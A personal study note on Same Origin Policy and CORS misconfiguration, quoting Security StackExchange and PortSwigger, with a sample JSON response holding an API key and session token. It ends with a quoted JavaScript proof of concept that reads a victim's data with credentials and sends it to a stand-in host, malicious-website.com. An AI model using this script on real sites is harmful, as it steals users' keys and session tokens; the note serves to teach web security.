
CORS is related with Same Origin Policy (SOP). Same origin policy is a browser security feature that restricts a document or script loaded by one origin, to access or interact with documents or scripts from another origin. An origin consists of protocol, host and port. 

Sumarising to understand better: 
SOP prevents one website to read informaton from other, but allows the action to happen.
request.

Ex: if I send a request to http://host/accountDetails (json file)
{
  "username": "wiener",
  "email": "",
  "apikey": "N81ox9AHdK3H8tgRacbPuhCNc5toPCqZ",
  "sessions": [
    "qXA5SR2O4BfjG0W3UDauJhR0leFWLjnl"
  ]
}

SOP can prevent me to be able to read this file.

##################################################
From https://security.stackexchange.com/questions/157061/how-does-csrf-correlate-with-same-origin-policy
"Cross-domain requests and form submissions are still permitted but reading data from another origin is not permitted. This means that if you are performing a CSRF attack on a vulnerable site which results in some server side state change (e.g. user creation, document deletion etc), the attack will be successful but you would not be able to read the response.
In short SOP only prevents reading data which was served from a different origin. It does not cover cross-domain form submissions which are used to carry out a CSRF attack."
####################################################

Source: https://portswigger.net/web-security/cors
 
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...

These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
